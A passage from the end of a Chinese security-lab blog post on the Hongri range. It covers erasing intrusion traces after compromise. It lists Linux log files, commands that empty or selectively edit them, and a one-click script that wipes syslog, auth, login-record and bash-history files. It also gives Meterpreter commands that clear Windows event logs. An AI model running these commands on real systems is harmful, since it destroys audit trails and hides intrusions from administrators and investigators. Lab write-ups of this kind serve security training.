<li><p>/var/log/secure 记录安全相关的日志信息</p>
</li>
<li><p>/var/log/maillog 记录邮件相关的日志信息</p>
</li>
<li><p>/var/log/message 记录系统启动后的信息和错误日志</p>
</li>
<li><p>/var/log/cron 记录定时任务相关的日志信息</p>
</li>
<li><p>/var/log/spooler 记录UUCP和news设备相关的日志信息</p>
</li>
<li><p>/var/log/boot.log 记录守护进程启动和停止相关的日志消息</p>
</li>
<li><p>完全删除日志文件：</p>
</li>
<li><p>cat /dev/null &gt; filename</p>
</li>
<li><p>: &gt; filename</p>
</li>
<li><p>&gt; filename</p>
</li>
<li><p>echo “” &gt; filename</p>
</li>
<li><p>echo &gt; filename</p>
</li>
<li><p>针对性删除日志文件：</p>
</li>
<li><p>删除当天日志</p>
</li>
<li><p>sed  -i ‘/当天日期/‘d  filename</p>
</li>
<li><p>一键清除脚本：</p>
</li>
<li><p>#!/usr/bin/bash</p>
</li>
<li><p>echo &gt; /var/log/syslog</p>
</li>
<li><p>echo &gt; /var/log/messages</p>
</li>
<li><p>echo &gt; /var/log/httpd/access_log</p>
</li>
<li><p>echo &gt; /var/log/httpd/error_log</p>
</li>
<li><p>echo &gt; /var/log/xferlog</p>
</li>
<li><p>echo &gt; /var/log/secure</p>
</li>
<li><p>echo &gt; /var/log/auth.log</p>
</li>
<li><p>echo &gt; /var/log/user.log</p>
</li>
<li><p>echo &gt; /var/log/wtmp</p>
</li>
<li><p>echo &gt; /var/log/lastlog</p>
</li>
<li><p>echo &gt; /var/log/btmp</p>
</li>
<li><p>echo &gt; /var/run/utmp</p>
</li>
<li><p>rm ~/./bash_history</p>
</li>
<li><p>history -c</p>
</li>
</ul>
</li>
<li><p>Windows</p>
<ul>
<li><p>1.查看事件日志run event_manager -i</p>
</li>
<li><p>2.删除事件日志run event_manager -c</p>
</li>
<li><p>3.clearv命令清除目标系统的事件日志。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/">红日靶场</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91/">内网</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/10/30/%E7%BA%A2%E6%97%A57/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">红日7</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/10/30/%E7%BA%A2%E6%97%A51/">
                        <span class="hidden-mobile">红日1</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud 统计PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            总访问量 
            <span id="leancloud-site-pv"></span>
             次
          </span>
      
      
        <!-- LeanCloud 统计UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            总访客数 
            <span id="leancloud-site-uv"></span>
             人
          </span>
      

    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>




  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      $('#local-search-input').on('click', function() {
        searchFunc(path, 'local-search-input', 'local-search-result');
      });
      $('#modalSearch').on('shown.bs.modal', function() {
        $('#local-search-input').focus();
      });
    })()
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
